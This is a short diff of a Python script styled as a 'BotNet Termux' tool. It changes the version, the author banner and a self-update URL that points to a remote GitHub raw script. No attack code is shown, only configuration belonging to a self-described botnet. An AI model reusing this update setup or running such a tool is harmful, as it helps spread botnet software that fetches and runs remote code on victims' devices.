@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # 🔥 **VIP+++ BotNet Termux Advanced** 🔥
 # 🔰 **Author**: Anonymous
-# 🌐 **Version**: 1.0 Ganteng
+# 🌐 **Version**: 1.2
 # ⚠ **Warning**: Buat Edukasi Doang Goblok!
 
 import os
@@ -30,7 +30,7 @@ VPN_ENABLED = False
 TOR_ENABLED = False
 ANONYMOUS_MODE = True
 ENCRYPTION_KEY = "X-NexoDev28@@"
-UPDATE_URL = "https://raw.githubusercontent.com/example/botnet-termux/main/botnet.py"  # Ganti dengan URL RAW GitHub lu
+UPDATE_URL = "https://raw.githubusercontent.com/Habibzz01/UpdateTools-/refs/heads/main/botnet.py"  # Ganti dengan URL RAW GitHub lu
 CURRENT_VERSION = "1.0"
 
 # ==================== SISTEM UPDATE ====================
@@ -94,7 +94,7 @@ class TerminalTheme:
   |_|  \_\___|\__|_| \_|\___|_|  \_\___/ \__|
        
         \033[1;32m⚡ Mode Anonymous: """ + ("Nyala" if ANONYMOUS_MODE else "Mati") + """ 
-        \033[1;31mDibuat Sama Anak Jaksel 👻🫦
+        \033[1;31mDeveloped Script By Xbibz Official 👻🫦
         \033[0m
         """)
 
